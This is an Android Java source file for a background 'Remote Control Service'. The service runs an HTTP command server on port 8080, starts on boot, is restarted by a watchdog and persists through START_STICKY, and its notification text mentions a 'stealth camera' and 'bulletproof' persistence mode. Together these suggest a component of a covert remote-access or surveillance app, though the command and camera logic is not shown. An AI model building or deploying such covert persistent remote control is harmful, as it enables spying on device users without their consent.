package com.example.myapplication555.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.myapplication555.R;
import com.example.myapplication555.core.CommandProcessor;
import com.example.myapplication555.network.HttpServerManager;

/**
 * Remote Control Service - Runs in background to handle remote commands
 * This service runs an HTTP server that listens for commands from remote clients
 */
public class RemoteControlService extends Service {
    private static final String TAG = "RemoteControlService";
    private static final String CHANNEL_ID = "RemoteControlChannel";
    private static final int NOTIFICATION_ID = 1001;

    private HttpServerManager httpServer;
    private CommandProcessor commandProcessor;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "Remote Control Service created");
        
        // Create notification channel for foreground service
        createNotificationChannel();
        
        // Initialize command processor and HTTP server
        commandProcessor = new CommandProcessor(this);
        httpServer = new HttpServerManager(commandProcessor);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        boolean isAutoStart = intent != null && intent.getBooleanExtra("auto_start", false);
        boolean isWatchdogRestart = intent != null && intent.getBooleanExtra("watchdog_restart", false);
        
        if (isAutoStart) {
            Log.i(TAG, "Remote Control Service auto-started on boot");
        } else if (isWatchdogRestart) {
            Log.i(TAG, "🛡️ Remote Control Service restarted by watchdog - bulletproof mode active");
        } else {
            Log.i(TAG, "Remote Control Service started manually");
        }
        
        // Start as foreground service
        startForeground(NOTIFICATION_ID, createNotification(isAutoStart, isWatchdogRestart));
        
        // Start HTTP server to listen for commands
        boolean serverStarted = httpServer.startServer();
        
        if (serverStarted) {
            Log.i(TAG, "HTTP server started successfully on port 8080");
        } else {
            Log.e(TAG, "Failed to start HTTP server");
        }
        
        return START_STICKY; // Restart service if killed by system
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Remote Control Service destroyed");
        
        // Stop HTTP server
        if (httpServer != null) {
            httpServer.stopServer();
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service
    }

    /**
     * Create notification channel for Android O and above
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Remote Control Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Keeps the remote control service running in background");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    /**
     * Create notification for foreground service
     */
    private Notification createNotification() {
        return createNotification(false, false);
    }
    
    /**
     * Create notification for foreground service with startup info
     */
    private Notification createNotification(boolean isAutoStart, boolean isWatchdogRestart) {
        String title;
        String text;
        
        if (isWatchdogRestart) {
            title = "🛡️ Remote Control Bulletproof";
            text = "Restarted by watchdog - stealth camera & max persistence active";
        } else if (isAutoStart) {
            title = "🤖 Remote Control Auto-Started";
            text = "Auto-started on boot - stealth camera & bulletproof mode active";
        } else {
            title = "Remote Control Active";
            text = "Stealth camera & remote control via WiFi ready";
        }
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }
} 